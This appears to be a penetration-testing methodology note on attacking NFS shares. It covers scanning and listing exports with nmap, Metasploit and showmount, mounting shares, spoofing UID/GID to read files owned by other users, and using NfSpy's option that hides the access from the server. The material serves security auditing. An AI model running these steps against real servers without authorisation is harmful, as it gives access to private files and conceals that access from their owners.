# Network File System - Methodology

### Overview

The Network File System (NFS) is a distributed file system protocol, built on
Remote Procedure Call (RPC) and used to share folders and files between
computers.

NFS is often used with Unix and Unix-like operating systems. For NFS before
version 4, the user id and group id of the client system are sent in each RPC
call, and the permissions these IDs have on the file being accessed are checked
on the server.

### Network scan and mount points enumeration

The following tools can be used to scan the network for NFS services and
enumerate their exposed mount points:

```
nmap -v -p 111,2049 -sV --script=nfs-showmount.nse -oA nmap_nfs <RANGE | CIDR | HOSTNAME | IP>
msf> use auxiliary/scanner/nfs/nfsmount

showmount --exports <HOSTNAME | IP>
```

### Mount shares

The Linux utility `mount` can be used to mount a NFS share:

```
mkdir /tmp/NFS_SHARE

mount -t nfs <HOSTNAME | IP>:<SHARE> /tmp/NFS_SHARE

# Confirm the mounted share
df -k | grep NFS_SHARE
```

If the following error message is being returned by the `mount` utility, the
`nfs-common` package must be locally installed on the client system.

```
mount: /tmp/NFS_SHARE: bad option; for several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.<type> helper program.
```

### ID spoofing

For NFS before version 4, the server files access permissions are based on the
client system current user id and group id. `UID` and `GUID` can thus be
spoofed to access any directories and files exposed on the NFS export.

The server may use the `root_squash` mechanism that will make any requests
using the `UID` or `GID` 0 (root) to be treated like the nobody user.

```
# Inside mounted folder
ls -lah
-> drwxr-xr--  3 <UID> <GID>  [...] dir_or_file

useradd -u <UID> tmp_user
su tmp_user

# OR
groupadd -r -g <GID> tmp_group
useradd -G tmp_group <USERNAME>
```

The `NfSpy` python script can be used to automate the process, with the
advantage of hiding the access by immediately unmounting the share on the
server but keeping the file handle:

```
nfspy -o server=<HOSTNAME | IP>:<SHARE>,hide,allow_other,ro,intr /tmp/NFS_SHARE
```

### Connected users enumeration

The Linux utility `showmount` can be used to retrieve the active and currently
mounted shares and theirs clients:

```
showmount --all <HOSTNAME | IP>
```
